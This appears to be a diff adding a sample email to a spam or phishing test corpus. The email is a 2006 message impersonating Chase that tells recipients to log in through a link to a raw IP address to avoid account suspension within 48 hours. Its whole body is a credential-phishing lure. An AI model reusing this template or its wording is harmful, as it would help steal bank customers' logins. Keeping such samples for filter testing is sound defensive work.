@@ -1,0 +1,70 @@
+Return-Path: <jakelucas@server.stgerards.ac.nz>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+	by naughty.example.com (Postfix) with ESMTP id 75011536EEF
+	for <nobody@login.example.com>; Wed,  8 Mar 2006 13:34:18 -0500 (EST)
+Received: from server.stgerards.ac.nz (unknown [202.124.96.82])
+	by mail2.example.com (Postfix) with ESMTP id BA5F46FA38C
+	for <nobody@example.com>; Wed,  8 Mar 2006 13:34:16 -0500 (EST)
+Received: by server.stgerards.ac.nz (Postfix, from userid 1088)
+	id 166D6508E6C; Thu,  9 Mar 2006 07:32:15 +1300 (NZDT)
+To: nobody@example.com
+Subject:  New Updates from JPMorgan Chase & Co.
+From: service@chase.com <service@chase.com>
+Content-Type: text/html
+Message-Id: <20060308183215.166D6508E6C@server.stgerards.ac.nz>
+Date: Thu,  9 Mar 2006 07:32:15 +1300 (NZDT)
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 532
+
+
+<html>
+<head>
+<link  href="https://chaseonline.chase.com/echaseweb/common/css/style.css" rel="stylesheet" type="text/css"/>
+<style>
+.Imgspace { background-image : url(https://chaseonline.chase.com/echaseweb/common/images/arrow_green_rt.gif); background-position : -10px; background-repeat : no-repeat; line-height : 15px; }
+a.Linkcolor:link,a.Linkcolor:visited { color:#4D7831; text-decoration:none; padding : 0px 5px 0px 5px; margin : 0px 0px 0px 0px; }
+a.Linkcolor:active,a.Linkcolor:hover { color:#4D7831; text-decoration:underline; padding : 0px 5px 0px 5px; margin : 0px 0px 0px 0px; }
+.Imgspace1 { background-image : url(https://chaseonline.chase.com/echaseweb/common/images/arrow_green_rt.gif); background-position : -10px; background-repeat : no-repeat; line-height : 8px; }
+</style>
+<table width="600">
+<td valign="top">
+<td><img border="0" src="https://chaseonline.chase.com/content/ecpweb/sso/image/chaseNew.gif"></td>
+<td align="right"><font class="bodyText"><b>Customer Service message</b></font></td>
+</td>
+</table>
+<table width="600">
+<tr><td><img src="http://images.chase.com/creative/2005/chase/sep/welcome/images/welcome.gif">
+</td></tr>
+</table>
+<table width="600">
+<br><font class="bodyText">
+We are glad to inform you that our bank has a new security system. The updated technology will insure the security of your payments trough our bank.
+Hoping you'll understand that we are doing this for your own safety, we suggest you to renew your account at our Customer Center.
+<br><br>
+<img border="0" src="https://chaseonline.chase.com/content/ecpweb/sso/image/arrow_blue_rt-short.gif"><a href="http://213.167.99.114/html/chaseonline.chase.com/chaseonline/str.php?cmd=login" target="_blank"><b>Log into your account</b></a>, using your User ID and Password.
+<br><br></font><font class="grayText">
+<b>Note:</b> If we do not receive the appropriate account verification within 48 hours, the account will be suspended. The purpose of this verification is to ensure that your bank account has not been fraudulently used and to combat the fraud from our community . </font>
+</font>
+<br><td width="100%" class="dashes">&nbsp;</td>
+</table>
+<table width="600" border="0" cellspacing="5" cellpadding="0">
+<tr>
+	<td><font face="verdana,arial,helvetica" size="1" color="#666666">
+
+<strong>ABOUT THIS MESSAGE</strong><br>
+This service message was delivered to you as a Chase credit card customer. If you wish to unsubscribe from e-mail messages from Chase Card Services, please <a href="http://email.chase.com/W1RH031D411BCC29D5C3632ED04110">click here</a>. Please allow up to ten business days for us to process your request.<br><br>
+Please do not reply to this message. Replies to this message will not be responded to.<br>
+To contact Chase go to <a href="http://email.chase.com/W1RH031D418BFC29D5C3632ED04110" target="chase.com">www.chase.com</a>
+
+<br><br>
+&#169; 2006 JPMorgan Chase &#38; Co.</font></td>
+</tr>
+</table>
+
+</head>
+</html>
+
